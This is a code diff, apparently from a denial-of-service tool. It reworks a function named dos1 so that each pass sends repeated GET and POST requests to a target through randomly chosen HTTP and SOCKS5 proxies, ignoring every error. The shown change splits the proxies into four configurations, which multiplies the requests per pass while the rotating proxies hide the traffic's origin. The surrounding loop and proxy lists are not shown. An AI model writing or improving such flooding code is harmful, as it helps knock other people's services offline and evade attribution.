@@ -51,16 +51,56 @@ def dos1(target):
 
         proxyagenthttp = random.choice(proxy_http)
         proxyagentsocks = random.choice(proxy_socks)
-        proxieshttp = {
-            'http': f'http://{proxyagenthttp}',
-            'https': f'http://{proxyagenthttp}',
-            'http': f'socks5://{proxyagentsocks}',
+        proxieshttphttp = {
+            'http': f'http://{proxyagenthttp}'
+        }
+        proxieshttphttps = {
+            'https': f'http://{proxyagenthttp}'
+        }
+        proxiessockshttp = {
+            'http': f'socks5://{proxyagentsocks}'
+        }
+        proxiessockshttps = {
             'https': f'socks5://{proxyagentsocks}'
         }
 
         try:
-            s.get(target, headers=header, proxies=proxieshttp)
-            s.post(target, headers=header2, proxies=proxieshttp)
+            s.get(target, headers=header, proxies=proxieshttphttp)
+        except:
+            pass
+
+        try:
+            s.post(target, headers=header2, proxies=proxieshttphttp)
+        except:
+            pass
+
+        try:
+            s.get(target, headers=header, proxies=proxieshttphttps)
+        except:
+            pass
+
+        try:
+            s.post(target, headers=header2, proxies=proxieshttphttps)
+        except:
+            pass
+
+        try:
+            s.get(target, headers=header, proxies=proxiessockshttp)
+        except:
+            pass
+
+        try:
+            s.post(target, headers=header2, proxies=proxiessockshttp)
+        except:
+            pass
+
+        try:
+            s.get(target, headers=header, proxies=proxiessockshttps)
+        except:
+            pass
+
+        try:
+            s.post(target, headers=header2, proxies=proxiessockshttps)
         except:
             pass
 
